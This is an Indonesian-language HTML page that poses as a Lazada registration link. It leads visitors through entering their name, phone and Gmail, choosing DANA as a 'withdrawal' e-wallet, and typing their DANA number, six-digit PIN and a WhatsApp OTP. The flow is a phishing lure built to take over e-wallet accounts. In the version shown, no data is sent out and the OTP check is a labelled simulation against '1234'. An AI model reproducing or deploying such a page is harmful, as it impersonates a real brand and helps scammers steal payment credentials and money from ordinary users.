<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Pendaftaran Lazada</title>
<style>
  body {
    margin:0;
    font-family: "Poppins", Arial, sans-serif;
    background:#f8f9fb;
    color:#333;
    display:flex;
    align-items:center;
    justify-content:center;
    height:100vh;
  }
  .card {
    background:#fff;
    width:90%;
    max-width:380px;
    border-radius:16px;
    box-shadow:0 4px 15px rgba(0,0,0,0.1);
    padding:28px 24px;
    text-align:center;
    animation:fadeIn 0.4s ease;
  }
  @keyframes fadeIn {
    from{opacity:0;transform:translateY(20px);}
    to{opacity:1;transform:translateY(0);}
  }
  .logo {
    width:120px;
    margin-bottom:10px;
  }
  h1 {
    color:#007bff;
    font-size:22px;
    margin-bottom:8px;
  }
  p {
    color:#555;
    font-size:0.95rem;
    margin-bottom:18px;
  }
  input,button {
    width:100%;
    padding:12px;
    margin:7px 0;
    border:1.5px solid #ccc;
    border-radius:10px;
    font-size:15px;
    outline:none;
  }
  input:focus {
    border-color:#007bff;
  }
  .input-group {
    display:flex;
    align-items:center;
    gap:8px;
    border:1.5px solid #ccc;
    border-radius:10px;
    padding:6px 10px;
  }
  .input-group img {width:24px;height:16px;}
  .input-group span {color:#333;font-weight:500;}
  .input-field {
    flex:1;
    border:none;
    outline:none;
    font-size:15px;
  }
  button.primary {
    background:#007bff;
    color:#fff;
    font-weight:600;
    border:none;
    cursor:pointer;
    margin-top:10px;
  }
  button.primary:hover {background:#0069d9;}
  label {display:flex;align-items:center;gap:8px;font-size:0.9rem;color:#555;margin-top:10px;}
  input[type=checkbox]{width:16px;height:16px;}
  .hidden{display:none!important;}

  .wallet-btn{
    width:100%;
    padding:12px;
    border:none;
    border-radius:10px;
    margin:8px 0;
    font-size:15px;
    font-weight:600;
  }
  .wallet-btn.active{
    background:#00b14f;color:#fff;
  }
  .wallet-btn.inactive{
    background:#eee;color:#999;
  }

  /* PIN + OTP */
  .input-boxes {
    display:flex;
    justify-content:center;
    gap:8px;
    margin:15px 0;
  }
  .pin-input,.otp-input {
    width:40px;
    height:45px;
    text-align:center;
    font-size:20px;
    border:1.5px solid #ccc;
    border-radius:8px;
  }
  .otp-input:focus,.pin-input:focus {
    border-color:#007bff;
  }
  .error-text {
    color:#e60000;
    font-size:0.85rem;
    margin-bottom:6px;
  }

  .overlay {
    position:fixed;inset:0;
    display:flex;align-items:center;justify-content:center;
    background:rgba(0,0,0,0.5);
  }
  .modal {
    background:#fff;
    border-radius:14px;
    padding:20px;
    width:90%;
    max-width:340px;
    text-align:center;
  }
  .modal h2 {color:#007bff;margin-bottom:8px;}
  .modal p {color:#555;margin:0 0 12px;}
  .modal button {
    width:100%;
    padding:10px;
    border:none;
    border-radius:8px;
    font-weight:600;
    margin-top:6px;
  }
  .btn-send {background:#007bff;color:#fff;}
  .btn-resend {background:#f1f1f1;color:#333;}
  .resend-row {display:flex;gap:6px;}
</style>
</head>
<body>

<!-- PAGE 1 -->
<div class="card" id="page1">
  <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/4d/Lazada_Logo.svg/512px-Lazada_Logo.svg.png">
  <h1>Lazada</h1>
  <p>Link Pendaftaran</p>
  <form id="form1">
    <input id="nama" type="text" placeholder="Nama Lengkap" required>
    <div class="input-group">
      <img src="https://upload.wikimedia.org/wikipedia/commons/9/9f/Flag_of_Indonesia.svg">
      <span>+62</span>
      <input id="hp" type="tel" inputmode="numeric" class="input-field" placeholder="81234567890" maxlength="11" required>
    </div>
    <input id="mail" type="email" placeholder="Alamat Gmail" required>
    <label><input type="checkbox" required> Saya setuju dengan syarat & ketentuan</label>
    <button class="primary" type="submit">Daftar</button>
  </form>
</div>

<!-- PAGE 2 -->
<div class="card hidden" id="page2">
  <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/4d/Lazada_Logo.svg/512px-Lazada_Logo.svg.png">
  <h1>Pilih E-Wallet Penarikan</h1>
  <button id="dana" class="wallet-btn active">DANA</button>
  <button class="wallet-btn inactive" disabled>OVO</button>
  <button class="wallet-btn inactive" disabled>GoPay</button>
  <button class="wallet-btn inactive" disabled>ShopeePay</button>
</div>

<!-- PAGE 3 -->
<div class="card hidden" id="page3">
  <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/4d/Lazada_Logo.svg/512px-Lazada_Logo.svg.png">
  <h1>Masukkan Nomor DANA</h1>
  <form id="formDana">
    <div class="input-group">
      <img src="https://upload.wikimedia.org/wikipedia/commons/9/9f/Flag_of_Indonesia.svg">
      <span>+62</span>
      <input id="noDana" type="tel" inputmode="numeric" class="input-field" placeholder="81234567890" maxlength="11" required>
    </div>
    <button class="primary" type="submit">Lanjutkan</button>
  </form>
</div>

<!-- PAGE 4 -->
<div class="card hidden" id="page4">
  <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/4d/Lazada_Logo.svg/512px-Lazada_Logo.svg.png">
  <h1>Masukkan PIN</h1>
  <div class="input-boxes" id="pinContainer">
    <input type="password" maxlength="1" inputmode="numeric" class="pin-input">
    <input type="password" maxlength="1" inputmode="numeric" class="pin-input">
    <input type="password" maxlength="1" inputmode="numeric" class="pin-input">
    <input type="password" maxlength="1" inputmode="numeric" class="pin-input">
    <input type="password" maxlength="1" inputmode="numeric" class="pin-input">
    <input type="password" maxlength="1" inputmode="numeric" class="pin-input">
  </div>
  <button id="nextOtp" class="primary">Lanjutkan</button>
</div>

<!-- OTP POPUP -->
<div id="otpOverlay" class="overlay hidden">
  <div class="modal">
    <h2>Masukkan Kode OTP</h2>
    <p>Kode OTP telah dikirim melalui WhatsApp.</p>
    <p id="otpError" class="error-text hidden">Kode OTP tidak valid</p>
    <div class="input-boxes" id="otpInputs">
      <input type="text" maxlength="1" inputmode="numeric" class="otp-input">
      <input type="text" maxlength="1" inputmode="numeric" class="otp-input">
      <input type="text" maxlength="1" inputmode="numeric" class="otp-input">
      <input type="text" maxlength="1" inputmode="numeric" class="otp-input">
    </div>
    <button id="send" class="btn-send">Kirim</button>
    <div class="resend-row">
      <button id="resendWA" class="btn-resend" disabled>WhatsApp (30s)</button>
      <button id="resendSMS" class="btn-resend" disabled>SMS (30s)</button>
    </div>
  </div>
</div>

<script>
function showPage(id){
  ['page1','page2','page3','page4'].forEach(p=>{
    document.getElementById(p).classList.toggle('hidden',p!==id);
  });
}
document.getElementById('form1').onsubmit=e=>{
  e.preventDefault();showPage('page2');
};
document.getElementById('dana').onclick=()=>showPage('page3');
document.getElementById('formDana').onsubmit=e=>{
  e.preventDefault();
  const val=document.getElementById('noDana').value.trim();
  if(!/^\d{11}$/.test(val)){
    alert('Nomor DANA harus 11 digit setelah +62');
    return;
  }
  showPage('page4');
};
const pinInputs=document.querySelectorAll('.pin-input');
pinInputs.forEach((input,idx)=>{
  input.addEventListener('input',()=>{
    input.value=input.value.replace(/\D/g,'');
    if(input.value && idx<pinInputs.length-1) pinInputs[idx+1].focus();
  });
  input.addEventListener('keydown',e=>{
    if(e.key==='Backspace' && !input.value && idx>0) pinInputs[idx-1].focus();
  });
});
document.getElementById('nextOtp').onclick=()=>{
  const pin=[...pinInputs].map(i=>i.value).join('');
  if(pin.length!==6){alert('PIN harus 6 digit');return;}
  openOtp();
};

const otpBox=document.getElementById('otpOverlay');
const otpError=document.getElementById('otpError');
const waktuWA=document.getElementById('resendWA');
const waktuSMS=document.getElementById('resendSMS');
let t1,t2;
function openOtp(){
  otpBox.classList.remove('hidden');
  otpError.classList.add('hidden');
  startTimers();
  const inputs=document.querySelectorAll('.otp-input');
  inputs[0].focus();
  inputs.forEach((input,idx)=>{
    input.addEventListener('input',()=>{
      input.value=input.value.replace(/\D/g,'');
      if(input.value && idx<inputs.length-1) inputs[idx+1].focus();
    });
    input.addEventListener('keydown',e=>{
      if(e.key==='Backspace' && !input.value && idx>0) inputs[idx-1].focus();
    });
  });
}
function startTimers(){
  clearInterval(t1);clearInterval(t2);
  let s1=30,s2=30;
  waktuWA.disabled=true;waktuSMS.disabled=true;
  waktuWA.textContent=`WhatsApp (${s1}s)`;waktuSMS.textContent=`SMS (${s2}s)`;
  t1=setInterval(()=>{
    s1--;waktuWA.textContent=`WhatsApp (${s1}s)`;
    if(s1<=0){clearInterval(t1);waktuWA.disabled=false;waktuWA.textContent='Kirim Ulang via WhatsApp';}
  },1000);
  t2=setInterval(()=>{
    s2--;waktuSMS.textContent=`SMS (${s2}s)`;
    if(s2<=0){clearInterval(t2);waktuSMS.disabled=false;waktuSMS.textContent='Kirim Ulang via SMS';}
  },1000);
}
document.getElementById('send').onclick=()=>{
  const otp=[...document.querySelectorAll('.otp-input')].map(i=>i.value).join('');
  if(otp.length!==4){otpError.textContent='Masukkan 4 digit OTP lengkap';otpError.classList.remove('hidden');return;}
  if(otp!=="1234"){otpError.textContent='Kode OTP tidak valid';otpError.classList.remove('hidden');return;}
  alert('Verifikasi OTP berhasil (simulasi)');
  otpBox.classList.add('hidden');
  showPage('page1');
};
waktuWA.onclick=()=>{startTimers();alert('Kode OTP dikirim ulang via WhatsApp');};
waktuSMS.onclick=()=>{startTimers();alert('Kode OTP dikirim ulang via SMS');};
</script>
</body>
</html>
